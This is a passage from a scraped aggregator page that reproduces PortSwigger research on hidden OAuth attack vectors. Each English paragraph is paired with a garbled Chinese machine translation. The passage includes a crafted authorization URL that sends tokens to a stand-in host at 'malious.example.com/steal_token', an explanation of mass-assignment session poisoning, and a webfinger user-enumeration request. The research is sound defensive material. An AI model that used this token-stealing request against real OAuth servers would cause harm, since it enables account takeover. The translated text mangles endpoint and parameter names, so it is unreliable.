http：//trusted.example.com/redirect / oauth / bearm_access？ client_id = c931f431-4e3a-4e63-84f7-948898b3cff9＆amp; response_type =代码＆amp;提示=同意＆amp;范围= OpenID＆amp; redirecturi = http://malious.example.com/steal_token the＆＃34; client_id＆＃34;参数可以来自用户已经信任的任何客户端应用程序。当＆＃34; / confir_access＆＃34;访问，从URL中获取所有参数和毒品模型/会话。现在，当用户批准第一个请求时（＆＃34; client_id＆＃34;它＆＃39; s trusted），授权令牌泄露给恶意网站。 </p><p> *Note: You may notice an intended difference between &#34;redirect_uri&#34; in the first request vs &#34;redirectUri&#34; in the second. This is intentional because the first one is a valid OAuth parameter whereas the second is a parameter name that actually binds to the &#34;AuthorizationRequest.redirectUri&#34; model attribute during mass assignment.</p><p>*注意：您可能会注意到＆＃34; redirect_uri＆＃34之间的预期差异;在第一个请求vs＆＃34; redirecturi＆＃34;在第二。这是故意的，因为第一个是有效的OAuth参数，而第二个是实际绑定到＆＃34; authorizationRequest.redirecturi＆＃34的参数名称;质量分配期间的模型属性。</p><p> The &#34;@ModelAttribute(&#34;authorizationRequest&#34;)&#34; annotation here is not necessary and creates additional risks during forwarding. A safer way to perform the same action is just to take these values from the &#34;Map&lt;String, Object&gt; model&#34; as an input parameter of the method annotated with @RequestMapping(&#34;/oauth/confirm_access&#34;).</p><p> ＆＃34; @modelattribute（＆＃34; authorizationRequest＆＃34;）＆＃34;注释在此没有必要，在转发期间创建额外的风险。执行相同动作的更安全的方法只是为了从＆＃34中取出这些值; map＆lt; string，对象＆gt;型号＆＃34;作为使用@requestmapping注释的方法的输入参数（＆＃34; / oauth / bearm_access＆＃34;）。</p><p> Even if mass assignment did not exist here, this vulnerability might still be exploitable by sending two authorization requests simultaneously so that they share the same session.</p><p> 即使在此处不存在大规模分配，也可以通过同时发送两个授权请求，以便它们共享相同的会话，这漏洞仍然可以利用。</p><p>  The &#34;/.well-known/webfinger&#34; is a standard OpenID endpoint that displays information about users and resources used on the server. For example, it can be used in the following way to validate that the user &#34;anonymous&#34; has an account on the server:</p><p>  ＆＃34; /。众所周知的/ webfinger＆＃34;是标准OpenID端点，显示有关服务器上使用的用户和资源的信息。例如，它可以以下列方式使用来验证用户＆＃34;匿名＆＃34;在服务器上有一个帐户：</p><p> /.well-known/webfinger? resource=http://x/ anonymous&amp; rel=http://op</p><p> /.well-known/webfinger？资源= http：// x /匿名＆amp; rel = http：// op</p><p>......</p><p>...... </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://portswigger.net/research/hidden-oauth-attack-vectors">https://portswigger.net/research/hidden-oauth-attack-vectors</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/攻击/">#攻击</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/attack/">#attack</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/服务器/">#服务器</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/分享/">#分享</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>